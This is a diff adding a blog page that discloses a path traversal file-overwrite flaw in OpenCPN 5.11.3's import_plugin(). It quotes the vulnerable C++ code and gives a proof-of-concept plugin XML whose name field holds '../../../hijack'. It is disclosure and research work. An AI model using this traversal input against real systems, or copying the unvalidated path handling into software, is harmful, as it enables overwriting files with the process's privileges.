@@ -1,0 +1,79 @@
+export const metadata = {
+  title: "OpenCPN File overwrite - Path traversal",
+  date: "2025-07-14 ~ 2025-07-25",
+  excerpt: "OpenCPN File Overwrite – Path Traversal Vulnerability in import_plugin",
+  category: "보안",
+  imageUrl: "/images/opencpn-command-injection.png",
+  award: "",
+  hidden: true,
+};
+
+[[KOR] OpenCPN File overwrite - import_plugin에서의 Path traversal 취약점](./opencpn-path-traversal-kor)  
+
+**Vulnerability Title:** OpenCPN File overwrite - Path traversal   
+**Vulnerability Summary:** File overwrite due to creation of a `.meta` file without path validation    
+**Vendor:** GitHub Open Source Project    
+**Software Name:** OpenCPN     
+**Version:** OpenCPN 5.11.3   
+**Software Type:** ECS (Electronic Chart System)    
+**Attack Type:** Path Traversal   
+**Impact:** File overwrite with process privileges  
+**Vulnerable File Name:** `Console.cpp`  
+**Vulnerable Function Name:** `import_plugin()`  
+**Vulnerable Parameter:** `metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);`  
+**Vulnerable Environment:** Ubuntu 24.04   
+
+**Proof of Concept:**  
+While analyzing console.cpp inside opencpn/cli , in import_plugin() : 
+```cpp
+void import_plugin(const std::string& tarball_path) {
+  auto handler = PluginHandler::GetInstance();
+  PluginMetadata metadata;
+  bool ok = handler->ExtractMetadata(tarball_path, metadata);
+  if (!ok) {
+    std::cerr << "Cannot extract metadata (malformed tarball?)\n";
+    exit(2);
+  }
+  if (!PluginHandler::IsCompatible(metadata)) {
+    std::cerr << "Incompatible plugin detected\n";
+    exit(2)
+  }
+  ok = handler->InstallPlugin(metadata, tarball_path);
+  if (!ok) {
+    std::cerr << "Error extracting import plugin tarball.\n";
+    exit(2);
+  }
+  metadata.is_imported = true;
+  auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
+  std::ofstream file(metadata_path);
+  file << metadata.to_string();
+  if (!file.good()) {
+    std::cerr << "Error saving metadata file: " << metadata_path << " for imported plugin: " << metadata.name;
+    exit(2);
+  }
+  exit(0);
+}
+```
+After confirming that there is no validation of the
+`metadata.name` path, an XML file was created for testing:  
+```xml
+ <?xml version="1.0" encoding="UTF-8"?>
+ <plugin version="1">
+ <name>../../../hijack</name>
+ <version>0.0.1</version>
+ <release>0</release>
+ <summary>PoC</summary>
+ <description>Path Traversal PoC</description>
+ <target>ubuntu-x86_64</target>
+ <build-target>ubuntu</build-target>
+ <build-gtk>gtk3</build-gtk>
+ <target-version>24.04</target-version>
+ <target-arch>x86_64</target-arch>
+ <api-version>1.18</api-version>
+ <tarball-url>file:///nope</tarball-url>
+ </plugin>
+```
+Inserted .. and / into `<name>` to attempt path traversal:  
+
+**Additional Materials (video, report attachments):**  
+<Video src="/videos/opencpn-path-traversal.mp4"/>    
